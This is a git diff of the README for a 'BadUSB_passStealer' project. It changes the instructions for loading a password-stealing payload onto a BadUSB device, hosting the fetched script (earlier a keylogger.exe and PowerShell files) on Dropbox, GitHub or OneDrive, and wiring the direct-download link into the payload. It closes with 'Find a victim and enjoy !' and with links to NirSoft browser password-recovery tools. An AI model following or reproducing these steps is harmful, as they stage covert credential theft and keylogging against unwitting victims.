@@ -50,7 +50,7 @@ cd BadUSB_passStealer
 
 3. Replace link in [.ino](https://github.com/tuconnaisyouknow/BadUSB_passStealer/blob/main/BadUSB_passStealer.ino) at line 85 or [.txt](https://github.com/tuconnaisyouknow/BadUSB_passStealer/blob/main/BadUSB_passStealer.txt) at line 28;
 
-4. Add your code in the **BadUSB** by **Arduino software**;
+4. Put the .ino or .txt file in your **BadUSB**;
 
 5. Find a victim and enjoy !
 ## Requirments for victim PC
@@ -60,29 +60,31 @@ cd BadUSB_passStealer
 ## Dropbox
 1. Create a dropbox account [here](https://www.dropbox.com);
 
-2. Upload ciaoV2.ps1;
+2. Upload your file;
 
-3. Copy the link of the file and change ?dl=0 by ?raw=1;
+3. Copy the link of the file and change ?dl=0 by ?dl=1;
 
-4. The link will be like this : https://dropbox.com/s/link/ciaoV2.ps1?raw=1;
+4. You will get a link like this : https://dropbox.com/s/link/YOURFILE?dl=1;
 
-5. Now put this link in the [BadUSB_passStealer.ino](https://github.com/tuconnaisyouknow/BadUSB_passStealer/blob/main/BadUSB_passStealer.ino) file;
+5. Now put this link in the [.ino](https://github.com/tuconnaisyouknow/BadUSB_passStealer/blob/main/BadUSB_passStealer.ino) or [.txt](https://github.com/tuconnaisyouknow/BadUSB_passStealer/blob/main/BadUSB_passStealer.txt) file;
 ## Github
 1. Create a Github account [here](https://github.com/signup);
 
 2. Create a public repository;
 
-3. Upload ciaoV2.ps1;
+3. Upload your file;
 
-4. Go to the ciaoV2.ps1 page and click on RAW button;
+4. Go to your file page and click on RAW button;
 
-5. Copy the link of the RAW page and put it in the [BadUSB_passStealer.ino](https://github.com/tuconnaisyouknow/BadUSB_passStealer/blob/main/BadUSB_passStealer.ino) file;
+5. Copy the RAW page link and put it in the [.ino](https://github.com/tuconnaisyouknow/BadUSB_passStealer/blob/main/BadUSB_passStealer.ino) or [.txt](https://github.com/tuconnaisyouknow/BadUSB_passStealer/blob/main/BadUSB_passStealer.txt) file;
 ## One Drive
 1. Create a One Drive account [here](https://signup.live.com/signup);
 
-2. Upload startScript.ps1 and keylogger.exe file;
+2. Upload your file file;
 
 3. Follow this [tutorial](https://mangolassi.it/topic/19276/how-to-configure-a-onedrive-file-for-use-with-wget)
+
+4. Put the link you got in the [.ino](https://github.com/tuconnaisyouknow/BadUSB_passStealer/blob/main/BadUSB_passStealer.ino) or [.txt](https://github.com/tuconnaisyouknow/BadUSB_passStealer/blob/main/BadUSB_passStealer.txt)
 # Nirsoft tools 🧰
 You can download nirsoft tools below if you want :
 * [WebBrowserPassView.exe](https://www.nirsoft.net/protected_downloads/passreccommandline.zip) (User : download ; Password : nirsoft123!);
